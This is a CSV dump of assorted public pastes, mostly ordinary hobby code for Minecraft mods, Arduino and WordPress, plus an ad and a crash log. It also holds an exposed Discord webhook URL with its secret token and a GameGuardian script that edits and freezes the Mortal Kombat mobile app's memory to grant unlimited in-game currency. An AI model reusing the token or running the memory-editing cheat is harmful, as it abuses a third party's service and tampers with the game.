id,title,username,language,date,content
Qzn8eepx,Gate control Draconic Core,Revector,Lua,Monday 9th of June 2025 12:52:20 AM CDT,"local config = {
    -- maxCoreEnergy - на этом уровне будет поддерживаться количество энергии в ядре
    -- 1000 * 10^9 соответсвунт 1000 B или 1 T
    maxCoreEnergy = 1000 * 10^9,
    maxDiffEnergy = 10000, -- максимальная скорость накапливания энергии Rf/t, тестировалось на этом значении
    step = 5000,  -- шаг изменния значения на гейте

    sleepTime = 1, -- шаг замеров в сек
}

local com = require('component')
local gpu = com.gpu
gpu.setResolution(80, 25) -- lvl 2

local function coreEnergy()
    return com.draconic_rf_storage.getEnergyStored()
end

local function format(num)
    if num > 10^12 then
        return string.format(""%0.3f T"", num/10^12)
    elseif num > 10^9 then
        return string.format(""%0.3f B"", num/10^9)
    elseif num > 10^6 then
        return string.format(""%0.3f M"", num/10^6)
    elseif num > 10^3 then
        return string.format(""%0.3f K"", num/10^3)
    else
        return string.format(""%d"", num)
    end
end

local filVal = 0
function expRunningAvg(newVal)
    filVal = filVal + ((newVal-filVal) * 0.3)
    return filVal
end

if false == com.isAvailable(""draconic_rf_storage"") then
    print(""Rf storage not connected!"")
    os.exit()
end

if false == com.isAvailable(""flux_gate"") then
    print(""Flux gate not connected!"")
    os.exit()
end

local time = os.time()
local energy = coreEnergy()

local w, h = gpu.getResolution()
function asbMax(t)
    local  max = t[1]
    for _, val in ipairs(t) do
        if math.abs(val) > max then
            max = math.abs(val)
        end
    end

    return max
end

local _MID = h/2 + 3
local _NUM_READ = w
local energyLog = {}
local current = 0

function displayGraph(diff)
    current = current + 1
    if current > _NUM_READ then
        current = 1
    end

    energyLog[current] = diff

    local maxVal = asbMax(energyLog)

    gpu.fill(1, _MID, w, 1, '━')
    local row = 1
    for i = current, _NUM_READ + current - 1 do
        local key = i % w + 1

        if energyLog[key] then
            local d = (math.ceil(energyLog[key] / (maxVal * 0.1)))
            if d > 0 then
                gpu.fill(row, _MID-d, 1, d, '█')
            else
                gpu.fill(row, _MID+1, 1, math.abs(d), '█')
            end
        end

        row = row + 1
    end
end

function displayData(core, diff, action, fluxGateFlow)
    gpu.fill(1, 1, w, h, "" "")
    gpu.set(2, 1, string.format("" Энергии в ядре: %s [%0.0f Rf]"", format(core), core))
    gpu.set(2, 2, string.format("" Выход на гейте: %s Rf [%0.0f Rf]  %s"", format(fluxGateFlow), fluxGateFlow, action))
    gpu.set(2, 3, string.format(' Накопление энергии: %0.1f Rf/t', diff))

    displayGraph(diff)
end

local running = true
while running do
    os.sleep(config.sleepTime)

    local tmpEnergy = coreEnergy()
    local tmpTime = os.time()

    local energyDiff = tmpEnergy - energy
    local timeDiff = tmpTime - time

    local diff = expRunningAvg(energyDiff / timeDiff)

    local fluxGateFlow = com.flux_gate.getFlow();

    local action = """"

    if tmpEnergy > config.maxCoreEnergy then
        if diff > (config.maxDiffEnergy * -1) then
            action = 'Повышаю ▲'
            com.flux_gate.setSignalLowFlow(fluxGateFlow + config.step)
        end
    else
        if diff < config.maxDiffEnergy then
            action = 'Понижаю ▼'
            com.flux_gate.setSignalLowFlow(fluxGateFlow - config.step)
        end
    end

    displayData(tmpEnergy, diff, action, fluxGateFlow)

    time = tmpTime
    energy = tmpEnergy
end
"
dXArsMfR,**Fall Detection** rev_01,pleasedontcode,Arduino,Monday 9th of June 2025 12:38:03 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Fall Detection**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-06-09 05:34:17

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* it wont reset after i pressed cancellation button */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include ""TinyGPS.h"" // Include TinyGPS library
#include ""SoftwareSerial.h"" // Include SoftwareSerial library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t cancellationbutton_PushButton_PIN_D2		= 2;
#define buttonPin 8 // Confirmation button
#define cancelButtonPin 7 // Cancellation button

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t myLED_LED_PIN_D3		= 3;
#define buzzerPin 6 // Buzzer pin
#define ledPin 5 // LED pin

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool	myLED_LED_PIN_D3_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float	myLED_LED_PIN_D3_phyData		= 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
SoftwareSerial GPRS(2,3); // RX=pin 2, TX=pin 3
SoftwareSerial serial_connection(10, 11); // RX=pin 10, TX=pin 11
TinyGPSPlus gps; // This is the GPS object that will work with the NMEA data

// Pins and variables declarations
float latitude=0; 
float longitude=0;                       
String Speed="""";
int Contrast=20;

// Accelerometer pins
#define x A1
#define y A2
#define z A3

// Pulse Sensor pin
#define pulseSensorPin A0 

// Variables corresponding to accelerometer
int xsample=0;
int ysample=0;
int zsample=0;

#define samples 10 // number of sample readings in still case
#define fallThreshold 650 // Fall Detection Threshold

// Threshold maximum and minimum values of change in acceleration when fall is detected
#define minVal -50
#define MaxVal 50

// Variables tracking button state
bool isFallDetected = false;
bool isFallConfirmed = false;
bool isFallCancelled = false;

// Assign timing
unsigned long fallTime; // when fall is detected
unsigned long confirmationTimeout = 5000; // Time wait for confirmation or cancellation button is 5 seconds
unsigned long confirmationWaitTime; // Time to wait for confirmation

// Pulse sensor variables
int pulseValue = 0;
unsigned long lastBeatTime = 0; // Last time heartbeat detected
unsigned long beatInterval = 0; // Time interval between beats
int heartRate = 0; // heart rate in BPM
int pulseThreshold = 512; // default threshold for pulse

// Function declarations
void triggerFallConfirmation(); 
void sendAlert(); 
void resetPotentiometer(); 

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600); // Start serial communication
	serial_connection.begin(9600); // This opens up communications to the GPS
	Serial.println(""successfully Initialized...."");
	Serial.println(""GPS Start""); // Just show to the monitor that the sketch has started
	
	// Taking samples in still case
	for(int i=0; i<samples; i++)  
	{    
		xsample += analogRead(x);    
		ysample += analogRead(y);    
		zsample += analogRead(z);  
	}    

	// Taking average
	xsample /= samples;  
	ysample /= samples;  
	zsample /= samples;  
	Serial.println(xsample);  
	Serial.println(ysample);  
	Serial.println(zsample);  
	delay(1000);  

	// Set pin mode for button, buzzer and led  
	pinMode(cancellationbutton_PushButton_PIN_D2, INPUT_PULLUP);
	pinMode(buttonPin, INPUT_PULLUP); // Confirmation button  
	pinMode(cancelButtonPin, INPUT_PULLUP); // Cancellation button  
	pinMode(buzzerPin, OUTPUT); // Buzzer pin  
	pinMode(ledPin, OUTPUT); // LED pin  
	pinMode(pulseSensorPin, INPUT); // Pulse sensor pin  
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	updateOutputs(); // Refresh output data
	
	while(serial_connection.available()) // While there are characters to come from the GPS  
	{    
		gps.encode(serial_connection.read()); // This feeds the serial NMEA data into the library one char at a time      
	}  
	if(gps.location.isUpdated())  
	{    
		// Get the latest info from the gps object which it derived from the data sent by the GPS unit    
		Serial.println(""Satellite Count : "");    
		Serial.println(gps.satellites.value());    
		Serial.println(""Latitude : "");    
		Serial.println(gps.location.lat(), 6);    
		Serial.println(""Longitude : "");    
		Serial.println(gps.location.lng(), 6);    
		Serial.println(""Speed MPH : "");    
		Serial.println(gps.speed.mph());    
		Serial.println(""Altitude Feet : "");    
		Serial.println(gps.altitude.feet());    
		Serial.println("""");  
	}  

	int value1 = analogRead(x);    
	int value2 = analogRead(y);    
	int value3 = analogRead(z);    
	int xValue = xsample - value1;    
	int yValue = ysample - value2;    
	int zValue = zsample - value3;        

	Serial.print(""x="");    
	Serial.println(xValue);    
	Serial.print(""y="");    
	Serial.println(yValue);    
	Serial.print(""z="");    
	Serial.println(zValue);    

	// Pulse sensor reading    
	pulseValue = analogRead(pulseSensorPin); // Read value from x axis potentiometer    
	pulseThreshold = map(analogRead(x), 0, 1023, 400, 600); // Adjust threshold range (400-600)    
	Serial.print(""Pulse Value : "");    
	Serial.println(pulseValue);    
	Serial.print(""Pulse Threshold : "");    
	Serial.println(pulseThreshold);    

	if(pulseValue > pulseThreshold)    
	{      
		if(millis() - lastBeatTime > 500) // Only count a beat every 500ms (roughly 60BPM)        
		{        
			heartRate = 60000 / (millis() - lastBeatTime); // Calculate heart rate in beats per minute        
			lastBeatTime = millis();        
			Serial.print(""Heart Rate : "");        
			Serial.println(heartRate);        
			// Check if heart rate is abnormal        
			if(heartRate < MIN_HEART_RATE || heartRate > MAX_HEART_RATE)        
			{          
				Serial.println(""Abnormal heart rate detected. Please confirm if fall has occured."");          
				triggerFallConfirmation(); // Confirm whether there's a fall or not        
			}              
		}    
	}  

	// Condition for Fall Detection    
	if(xValue < minVal || xValue > MaxVal || yValue < minVal || yValue > MaxVal || zValue < minVal || zValue > MaxVal)    
	{ // Fall Detected, send SMS to emergency contact        
		Serial.println(""Fall Detected, Please press the button to confirm..."");        
		isFallDetected = true; // When fall is detected                
		
		// Buzzer and LED on when fall is detected        
		digitalWrite(buzzerPin, HIGH); // Buzzer On        
		digitalWrite(ledPin, HIGH); // LED on        
		fallTime = millis(); // Record time when fall is detected        
		confirmationWaitTime = fallTime + confirmationTimeout; // Set timeout time for confirmation        

		// Confirmation button        
		while (!isFallConfirmed && !isFallCancelled && millis() < confirmationWaitTime)        
		{          
			// Wait for confirmation or cancellation button press          
			if (digitalRead(buttonPin) == LOW) // If confirmation button is pressed            
			{            
				isFallConfirmed = true;            
				Serial.println(""Fall is confirmed!"");            
				sendAlert(); // Send SMS alert            
				break; // Exit loop once fall is confirmed          
			}          
			if (digitalRead(cancelButtonPin) == LOW)            
			{            
				isFallCancelled = true; // If cancellation button is pressed            
				Serial.println(""Fall Detection cancelled"");            
				// Do not reset the state after cancellation
				digitalWrite(buzzerPin, LOW); // Buzzer off            
				digitalWrite(ledPin, LOW); // LED off            
				break;          
			}                  
		}        

		// If no confirmation or cancellation button is pressed, automatically confirm the fall        
		if(!isFallConfirmed && millis() >= confirmationWaitTime) 
		{          
			isFallConfirmed = true;          
			Serial.println(""No response, fall Detection is confirmed"");          
			sendAlert(); // send SMS automatically        
		}        

		// After confirmation or cancellation, reset fall detection        
		if (isFallCancelled)        
		{          
			resetPotentiometer(); // Reset Potentiometer values after confirmation          
			isFallDetected = false;          
			isFallConfirmed = false;          
			// Do not reset isFallCancelled to allow for further cancellations
			Serial.println(""Fall Detection reset."");          
			// Reset after cancellation and continue monitoring          
			digitalWrite(buzzerPin, LOW); // Buzzer off          
			digitalWrite(ledPin, LOW); // LED off        
		}        
	}      
	delay(1000);
}

void updateOutputs()
{
	digitalWrite(myLED_LED_PIN_D3, myLED_LED_PIN_D3_rawData);
}

// Send SMS alert
void sendAlert() 
{   
	// Initialize GPRS module        
	GPRS.begin(9600);        
	Serial.println(""Connecting to network..."");        
	delay(2000); // wait for network connection        
	Serial.println(""Should be connected to network by now"");        
	
	// Send SMS alerts with location        
	GPRS.print(""AT+CMGF=1\r""); // set SMS format to text mode        
	delay(1200);         
	GPRS.print(""AT+CMGS=\""+01xxxxxxxxx\""\r""); // Set phone number to send alert with (replace with actual number)
	delay(1200);                 
	
	// Message        
	GPRS.print(""Fall Detected!"");        
	GPRS.print(""Location:\n"");        
	GPRS.print(""Latitude : "");        
	GPRS.print(latitude);        
	GPRS.print(""\nLongitude : "");        
	GPRS.print(""\nGoogle Maps Link: http://maps.google.com/maps?&z=15&mrt=yp&t=k&q="");        
	GPRS.println(latitude);        
	GPRS.println(""+"");        
	GPRS.println(longitude);        
	GPRS.write(26); // Send SMS         
	GPRS.println(""SMS Sent!"");      
}

// Function resetting potentiometer
void resetPotentiometer() 
{  
	xsample = 0;  
	ysample = 0;  
	zsample = 0;  
	for(int i = 0; i < samples; i++) 
	{    
		xsample += analogRead(x);    
		ysample += analogRead(y);    
		zsample += analogRead(z);  
	}  
	// Average after reset  
	xsample /= samples;  
	ysample /= samples;  
	zsample /= samples;  
	Serial.println(""Potentiometer reset values: "");  
	Serial.println(xsample);  
	Serial.println(ysample);  
	Serial.println(zsample);
}

// Trigger fall confirmation based on abnormal heart rate
void triggerFallConfirmation() 
{  
	Serial.println(""Please press the confirmation button if fall has occured."");
}

/* END CODE */"
nHYTcAxX,Calculator,Rukerisu,Lua,Monday 9th of June 2025 12:36:51 AM CDT,"-- Calculator

local options = {
    ""Addition"",
    ""Subtraction"",
    ""Multiplication"",
    ""Division"",
    ""Exit""
}

-- Draw menu with current selection highlighted
local function drawMenu(selected)
    term.clear()
    term.setCursorPos(1,1)
    print(""=== Calculator ==="")
    print(""Use UP/DOWN arrows to navigate, ENTER to select.\n"")

    for i, option in ipairs(options) do
        if i == selected then
            term.setTextColor(colors.yellow)
            print(""> "" .. option)
            term.setTextColor(colors.white)
        else
            print(""  "" .. option)
        end
    end
end

local function readNumber(prompt)
    while true do
        write(prompt)
        local input = read()
        local num = tonumber(input)
        if num then
            return num
        else
            print(""Invalid input, please enter a number."")
        end
    end
end

local function calculator()
    local selected = 1
    drawMenu(selected)

    while true do
        local event, key = os.pullEvent(""key"")
        if key == keys.up then
            selected = selected - 1
            if selected < 1 then selected = #options end
            drawMenu(selected)
        elseif key == keys.down then
            selected = selected + 1
            if selected > #options then selected = 1 end
            drawMenu(selected)
        elseif key == keys.enter then
            if options[selected] == ""Exit"" then
                term.clear()
                print(""Goodbye!"")
                break
            else
                -- Ask for numbers and calculate
                local a = readNumber(""Enter first number: "")
                local b = readNumber(""Enter second number: "")
                local result

                if options[selected] == ""Addition"" then
                    result = a + b
                    print(string.format(""Result: %.2f + %.2f = %.2f"", a, b, result))
                elseif options[selected] == ""Subtraction"" then
                    result = a - b
                    print(string.format(""Result: %.2f - %.2f = %.2f"", a, b, result))
                elseif options[selected] == ""Multiplication"" then
                    result = a * b
                    print(string.format(""Result: %.2f * %.2f = %.2f"", a, b, result))
                elseif options[selected] == ""Division"" then
                    if b == 0 then
                        print(""Error: Division by zero is not allowed."")
                    else
                        result = a / b
                        print(string.format(""Result: %.2f / %.2f = %.2f"", a, b, result))
                    end
                end

                print(""\nPress any key to return to menu..."")
                os.pullEvent(""key"")
                drawMenu(selected)
            end
        end
    end
end

calculator()"
tnaVLGZ5,"Compassionate and Effective Vein Treatment in West Hollywood, CA",usveinclinics,HTML,Monday 9th of June 2025 12:30:21 AM CDT,"USA Vein Clinics in West Hollywood provides expert care for varicose veins, spider veins, and other vein conditions using advanced, minimally invasive treatments. Our experienced vein specialists offer FDA-approved procedures such as Endovenous Laser Therapy (EVLT), Radiofrequency Ablation (RFA), and Sclerotherapy to help relieve leg pain, swelling, and discomfort. At Vein center in West Hollywood, our clinic offers compassionate, effective vein care in a modern, comfortable setting. Trust our skilled team to help you feel better and regain your confidence.
https://www.usaveinclinics.com/company/locations/california/office/west-hollywood/"
5pn0fjMG,add close button on Mobile Sticky Ads,arie_cristianD,PHP,Sunday 8th of June 2025 09:49:05 PM CDT,"
function add_close_button_to_ads() {
	?>
	<script>
		/* Add Close Button for  Mobile Sticky Ads */
		(function ($) {
			$(window).ready(function () {
				var container = $('.jnews_mobile_sticky_ads'),
				wrapper = container.find('.ads-wrapper');
				wrapper.html(wrapper.html() + '<span id=""close"">X</span>');
				wrapper.find('#close').click(function (e) {
					e.preventDefault();
					$(this).parent().parent().remove();
				});
			});
		})(jQuery);
	</script>
	<?php
}
add_action( 'wp_footer', 'add_close_button_to_ads' );"
gCVsnf1r,oijhgfdsa,MoneyLiza,Java,Sunday 8th of June 2025 09:40:07 PM CDT,https://discord.com/api/webhooks/1381470322527834186/EuPFhvX5CDeyqvqnandQjLWvqv_HdQPGSIYD_--mKEtFGbitbarPLHEr1i1WzLndR8X8
t1w0m1An,2025-06-09T04:39:08.882157,powerampache,PHP,Sunday 8th of June 2025 09:39:07 PM CDT,"1.00-70 (70) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
zLHhSgbc,Adonis Bypass 2,Steamhesaproblox,RBScript,Sunday 8th of June 2025 09:25:18 PM CDT,
2TX9kwYv,Quary,ChicagoFire3,Lua,Sunday 8th of June 2025 08:27:29 PM CDT,"require ""GenUtil""

local straight = 0
local depth = 0
local right = 0

local x2 = straight-1
local y2 = depth
local z2 = right

function CheckDig()
  local count = turtle.getItemCount(16)
  if count > 0 then
    turtle.select(1)
    turtle.placeUp()
    EmptyUp(1)
  end
end

local GoRight = true;
local Reverse = true;

while y2 > 0 do
  y2 = y2-1
  turtle.digDown()
  turtle.down()

  while z2 > 0 do
    z2 = z2-1
    while x2 > 0 do
      x2 = x2-1
      CheckDig()
      turtle.dig()
      turtle.forward()
    end
    x2 = straight-1
    if not (z2 == 0) then
      if GoRight then
        turtle.turnRight()
        turtle.dig()
        turtle.forward()
        turtle.turnRight()
        GoRight = not GoRight
      else
        turtle.turnLeft()
        turtle.dig()
        turtle.forward()
        turtle.turnLeft()
        GoRight = not GoRight
      end
    end
  end
  turtle.turnRight()
  turtle.turnRight()
  z2 = right
end"
fRJMiqF6,Souls Seeker,pastebinserver2021,Lua,Sunday 8th of June 2025 07:55:03 PM CDT,"active = 1
gg.setVisible(false) 
gg.getResults(gg.getResultsCount())
gg.clearResults()
v = gg.getTargetInfo()
if v.x64 then
gg.getRanges() 
gg.setRanges(gg.REGION_ANONYMOUS) 
else
gg.alert(""Script Works Only On 64 Game\nDownload 64 Bit Mk Mobile and Try Again"")
os.exit()
end
-------------------------------------------------------------------------
if v.processName ~= ""com.wb.goog.mkx""then
  gg.alert(""This Script is not for\n\n"".. v.processName .. ""\n"".. v.label .. ""\n\nPlease Select the Correct Game:\nMortal Kombat"", (""EXIT""))
  gg.getResults(gg.getResultsCount())
  gg.clearResults()
  gg.toast(""Good-bye  ;-)"") 
  print(""KKBS4U SCRIPTS\nGOOD BYE :-)"")
  os.exit()
  end
-------------------------------------------------------------------------
if v.versionName ~= ""6.2.0""then 
gg.getResults(gg.getResultsCount())
gg.clearResults()  
gg.alert(""This Script is Only for:\nMortal Kombat v 6.1.0"", ""GOODBYE"", nil, (""EXIT""))
gg.toast(""Good-bye  ;-)"") 
gg.setVisible(true) 
print(""KKBS4U SCRIPTS\nGood Bye"")
os.exit()
end  
-------------------------------------------------------------------------
gg.toast(""KKBS4U SCRIPTS"")
gg.alert(""••WELCOME••\nxMKM Battle Mode Farming Script By KKBS4U SCRIPTS\n\nUnlimited Souls\nUnlimited Coins\nUnlimited Rare Equipments"",""ENTER"",nil,""KKBS4U SCRIPTS"")


function menu()
if AB==1 then ab=""[√]"" else ab=""[  ]"" end 
if AC==1 then ac=""[√]"" else ac=""[  ]"" end 
if AD==1 then ad=""[√]"" else ad=""[  ]"" end 
active = 0
multi = gg.multiChoice({
ab..'Setup Final Battle', 
ac..'Remove Cassie & Fatality', 
ad..'Weak Kitana Boss',
'Exit'},nil,""xMK VIP KKBS4U SCRIPTS\nSOULS, COINS, RARE EQUIP"")
if multi == nil then return end
if multi[1] == true then ch1() end
if multi[2] == true then ch2() end
if multi[3] == true then ch3() end
if multi[4] == true then exit() end
if multi == nil then return end
end



function ch1()
if AB == 1 then 
gg.alert(""You Already Used this Hack Go Back and check final battle[✓]"")
menu() return
end
wait()
x=""148600100~148900100"" t=d search() visible() 
o=-3336 offset()  x=""148600100~148900100"" refine()
o=8 offset() x=""148600100~148900100"" refine()
o=288 offset() x=""17~21""refine()
o=4 offset() x=0 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=9 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=6 edit() freeze()
o=4 offset() x=9 edit() freeze()
o=4 offset() x=0 edit() freeze()
o=4 offset() x=256 edit() freeze()
clear()
gg.toast(""Final Battle Set"")
AB = 1
return end



function ch2()
if AC == 1 then 
gg.alert(""You Already Used this Hack Go Back and check\nFatality and Cassie Removed[✓]"")
menu() return
end
wait()
x=""50;50;1;1;1;0:21"" t=d search() visible() 
x=50 refine() gg.searchPointer(0x12)
o=8 offset() x=1 refine() 
o=4 offset() x=1 refine()
o=52 offset() x=0 edit()
o=4 offset() x=0 edit()
o=-176 offset()  x=0 edit()
o=-4 offset() x=0 edit()
gg.searchPointer(0x1024)
o=-8 offset() x=0 edit()
clear()
gg.toast(""Fatality + Energy"")
AC = 1
return end


function ch3()
if AD == 1 then 
gg.alert(""You Already Used this Hack Go Back and Kitana boss already weak[✓]"")
menu() return
end
wait()
x=3000 t=d search() visible() 
o=4 offset() x=150 refine() x=1 edit()
o=4 offset() x=2000 refine() x=1 edit()
o=4 offset() x=1100 refine() x=1 edit()
o=-12 offset() x=3000 refine() x=1 edit()
clear()
gg.toast(""Kitana Weak Done"")
AD = 1
return end

--××××××××××××××××××××××××××××××××××××××××××
--××××××××××××××××××××××××××××××××××××××××××
d = gg.TYPE_DWORD  
e = gg.TYPE_DOUBLE
f = gg.TYPE_FLOAT

function offset()
gg.getResults(gg.getResultsCount())
local results = gg.getResults(gg.getResultsCount())     
for i, p in ipairs(results) do
results[i].address = results[i].address + o
results[i].flags = t
end  
gg.loadResults(results)
gg.getResults(gg.getResultsCount())
end 

function clear()
gg.getResults(gg.getResultsCount())
gg.clearResults()
end 

function clearall() 
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.getListItems()
gg.clearList()
end 

function freeze()
gg.getResults(gg.getResultsCount())
zz = gg.getResults(gg.getResultsCount())
for i, v in ipairs(zz) do
v.freeze = true
end
gg.addListItems(zz)
gg.getResults(gg.getResultsCount()) 
end 

function unfreeze()
gg.getResults(gg.getResultsCount())
zz = gg.getResults(gg.getResultsCount())
for i, v in ipairs(zz) do
v.freeze = false
end
gg.addListItems(zz)
gg.getResults(gg.getResultsCount()) 
end 

function search()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.searchNumber(x,t) 
end 

function refine()
gg.refineNumber(x,t) 
end 

function refinenot()
gg.refineNumber(x,t,false,gg.SIGN_NOT_EQUAL) 
end 

function edit()
gg.getResults(gg.getResultsCount())
gg.editAll(x,t) 
end 

function get()
gg.getResults(gg.getResultsCount())
end 

function head()
gg.getResults(gg.getResultsCount())
gg.getResults(1)
local header = gg.getResults(1)
gg.clearResults()
gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
gg.getResults(gg.getResultsCount())
end 

function heads()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
gg.getResults(gg.getResultsCount())
end 

function wait()
gg.toast(""Please Wait.. "") 
end 

function check()
gg.getResults(gg.getResultsCount())
local check = gg.getResultsCount()
if check == 0 then
gg.toast(""× ERROR ×"")
E = 0 else E = 1
end 
cnt = gg.getResultsCount() 
end 

function resume()
gg.processResume()
end


function visible()
if gg.isVisible() then 
gg.setVisible(false) 
gg.getListItems()
gg.clearList()
gg.getResults(gg.getResultsCount())
gg.clearResults()
gg.setVisible(true) 
print(""******************\n** ACCESS DENIED **\n******************"")
os.exit()
end   
end 

function exit()
clearall()
gg.toast(""Good-bye  ;-)"")
gg.setVisible(true) 
print(""MKM BY KKBS4U SCRIPTS\nNO HACKING NO ENJOYMENT"")
os.exit()
end


while true do
if gg.isVisible() then
active = 1
gg.setVisible(false)
gg.toast(""KKBS4U"")
end
if active == 1 then 
menu() 
end
end "
